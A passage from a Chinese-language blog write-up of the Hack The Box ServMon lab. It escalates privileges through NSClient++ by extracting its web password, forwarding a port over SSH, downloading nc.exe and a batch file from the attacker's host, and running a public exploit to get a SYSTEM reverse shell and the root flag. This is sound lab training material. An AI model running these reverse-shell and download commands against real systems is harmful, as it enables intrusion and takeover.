given a path. <br>  --add-defaults                Same as --add-missing <br>  --remove-defaults             Remove all keys which have <span class="hljs-keyword">default</span> <span class="hljs-title function_">values</span> <span class="hljs-params">(and  </span><br><span class="hljs-params">  --use-samples                 Add sample commands provided by some sections</span><br><span class="hljs-params">                                such as targets and real time filters</span><br><span class="hljs-params">  --activate-module arg         Add a module (and its configuration options) to</span><br><span class="hljs-params">                                the configuration.</span><br><span class="hljs-params"></span><br><span class="hljs-params">Client Options:</span><br><span class="hljs-params">  --load-all                    Load all plugins.</span><br><span class="hljs-params">  -e [ --exec ] arg             Run a command (execute)</span><br><span class="hljs-params">  -b [ --boot ]                 Boot the client before executing command</span><br><span class="hljs-params">                                (similar as running the command from test mode)</span><br><span class="hljs-params">  -q [ --query ] arg            Run a query with a given name</span><br><span class="hljs-params">  -s [ --submit ] arg           Submit passive check result</span><br><span class="hljs-params">  -M [ --module ] arg           Load specific module (in other words <span class="hljs-keyword">do</span> not</span><br><span class="hljs-params">                                <span class="hljs-keyword">auto</span> detect module)</span><br><span class="hljs-params">  -a [ --argument ] arg         List of arguments (arguments gets -- prefixed</span><br><span class="hljs-params">                                automatically (--argument foo=bar is the same</span><br><span class="hljs-params">                                as setting <span class="hljs-string">&quot;--foo bar&quot;</span>)</span><br><span class="hljs-params">  --raw-argument arg            List of arguments (does not get -- prefixed)</span><br><span class="hljs-params"></span><br><span class="hljs-params"></span><br><span class="hljs-params">First argument has to be one of the following: client, help, service, settings, unit,</span><br><span class="hljs-params">Or on of the following client aliases: check_mk, eventlog, ext, ext-scr, lua, mk, nrpe, nsca, nscp, op5, py, python,</span><br><span class="hljs-params"> sys, syslog, test, web, wmi,</span><br><span class="hljs-params">PS C:\Program Files\NSClient++&gt; .\nscp.exe --version</span><br><span class="hljs-params">NSClient++, Version: <span class="hljs-number">0.5</span><span class="hljs-number">.2</span><span class="hljs-number">.35</span> <span class="hljs-number">2018</span><span class="hljs-number">-01</span><span class="hljs-number">-28</span>, Platform: x64</span><br><span class="hljs-params">PS C:\Program Files\NSClient++&gt;  </span><br><span class="hljs-params"></span><br></code></pre></td></tr></table></figure>

<p>17、经过搜集，我们发现了漏洞信息</p>
<p><code>NSClient++ 0.5.2.35</code></p>
<p><code>https://www.exploit-db.com/exploits/46802</code></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<p>18、这里发现可以直接通过软件获取到密码 &#x3D; &#x3D;！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Program Files\NSClient++&gt; .\nscp.exe web -- password --display<br>Current password: ew2x6SsGTxjRwXOT<br>PS C:\Program Files\NSClient++&gt;  <br></code></pre></td></tr></table></figure>

<p>19、这里存在一个问题，就是我们密码是正确的，但是登录系统的时候一直登录不上</p>
<p><code>https://10.10.10.184:8443/index.html#/</code></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>20、回想前期的枚举过程，突然想到应该是配置限制了，果然是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">; Undocumented key<br>allowed hosts = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>

<p>21、由于这里存在端口限制，需要通过ssh把端口给转发出来，这里使用了SSH的本地转发，并结合sshpass 工具使用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sshpass -p <span class="hljs-string">&#x27;L1k3B1gBut7s@W0rk&#x27;</span> ssh nadine@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span> -L <span class="hljs-number">8443</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8443</span><br><br><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.864</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>nadine@SERVMON C:\Users\Nadine&gt;<br></code></pre></td></tr></table></figure>

<p>22、端口转发后，是可以正常访问的，就是有些卡，然后，这里原本我是想手动进行获取反弹shell的</p>
<p><code>下载nc和执行bat脚本工具</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\&gt; mkdir temp<br><br><br>    Directory: C:\<br><br> <br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">5</span>:<span class="hljs-number">27</span> AM                temp<br><br><br>PS C:\&gt; dir<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">3</span>:<span class="hljs-number">36</span> AM                inetpub<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                PerfLogs<br>d-r---        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                Program Files<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">07</span> PM                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span><br>d-----        2/28/2022   7:02 PM                RecData<br>d-----        2/28/2022   6:35 PM                Shared<br>d-----        3/17/2024   5:27 AM                temp<br>d-r---        2/28/2022   7:04 PM                Users<br>d-----        2/28/2022   6:02 PM                Windows<br><br><br>PS C:\&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.11:8000/nc.exe -Outfile C:\temp\nc.exe</span><br>PS C:\&gt;<br><br>iwr -uri http:<span class="hljs-comment">//10.10.14.11:8000/evil.bat -Outfile C:\temp\evil.bat</span><br><br><br>PS C:\&gt; cd .\temp\<br>PS C:\temp&gt; dir<br><br><br>    Directory: C:\temp<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        3/17/2024   5:27 AM          68608 nc.exe<br><br><br>PS C:\temp&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.11:8000/evil.bat -Outfile C:\temp\evil.bat</span><br>PS C:\temp&gt; dir<br><br><br>    Directory: C:\temp<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        3/17/2024   5:29 AM             52 evil.bat<br>-a----        3/17/2024   5:27 AM          68608 nc.exe<br><br><br>PS C:\temp&gt;<br><br>PS C:\temp&gt; type .\evil.bat<br>@echo off <br>C:\temp\nc.exe 10.10.14.11 443 -e cmd.exe<br>PS C:\temp&gt;<br><br>9. Add script foobar to call evil.bat and save settings<br>- Settings &gt; External Scripts &gt; Scripts<br>- Add New<br>	- foobar<br>		command = c:\temp\evil.bat<br><br><br><br><span class="hljs-number">10</span><span class="hljs-number">-11.</span> Add schedulede to call script every <span class="hljs-number">1</span> minute and save settings<br>- Settings &gt; Scheduler &gt; Schedules<br>- Add new<br>	- foobar<br>		interval = <span class="hljs-number">1</span>m<br>		command = foobar<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/ServMon-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
<p>23、各种操作下来，都是错误，没办法，我只能使用另一个脚本了</p>
<p><code>https://www.exploit-db.com/exploits/48360</code></p>
<p>24、直接利用获取反弹shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 <span class="hljs-number">48360.</span>py -t <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -P <span class="hljs-number">8443</span> -p ew2x6SsGTxjRwXOT -c <span class="hljs-string">&#x27;C:\temp\nc.exe 10.10.14.11 443 -e cmd.exe&#x27;</span><br>[!] Targeting base URL https:<span class="hljs-comment">//127.0.0.1:8443</span><br>[!] Obtaining Authentication Token . . .<br>[+] Got auth token: F69AzBlax3CF3EDNhm3soLBPh71Yexui<br>[!] Enabling External Scripts Module . . .<br>[!] Configuring Script with Specified Payload . . .<br>[+] Added External <span class="hljs-title function_">Script</span> <span class="hljs-params">(name: BJWoaXioB)</span><br>[!] Saving Configuration . . .<br>[!] Reloading Application . . .<br>[!] Waiting <span class="hljs-keyword">for</span> Application to reload . . .<br>[!] Obtaining Authentication Token . . .<br>[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ<br>[!] Triggering payload, should execute shortly . . .<br>[!] Timeout exceeded. Assuming your payload executed . . .<br><br><br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.11] <span class="hljs-title function_">from</span> <span class="hljs-params">(UNKNOWN)</span> [10.10.10.184] 51188<br>Microsoft Windows [Version 10.0.17763.864]<br><span class="hljs-params">(c)</span> 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Program Files\NSClient++&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Program Files\NSClient++&gt;<br></code></pre></td></tr></table></figure>

<p>25、获取最终的flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Program Files\NSClient++&gt;cd C:/Users/Administrator<br>cd C:/Users/Administrator<br><br>C:\Users\Administrator&gt;cd Desktop<br>cd Desktop<br><br>C:\Users\Administrator\Desktop&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">20</span>C1<span class="hljs-number">-47</span>A1<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">02</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">56</span> PM    &lt;DIR&gt;          .<br><span class="hljs-number">02</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">56</span> PM    &lt;DIR&gt;          ..<br><span class="hljs-number">03</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">03</span>:<span class="hljs-number">29</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">6</span>,<span class="hljs-number">095</span>,<span class="hljs-number">605</span>,<span class="hljs-number">760</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt;type root.txt<br>type root.txt<br>b76c8640f3363d576d50ffb7da187ba1<br><br>C:\Users\Administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/240</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ServMon-htb-writeup</div>
      <div>https://sh1yan.top/2024/03/17/ServMon-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年3月17日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/18/Love-htb-writeup/" title="Love-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Love-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/03/16/Remote-htb-writeup/" title="Remote-htb-writeup">
                        <span class="hidden-mobile">Remote-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
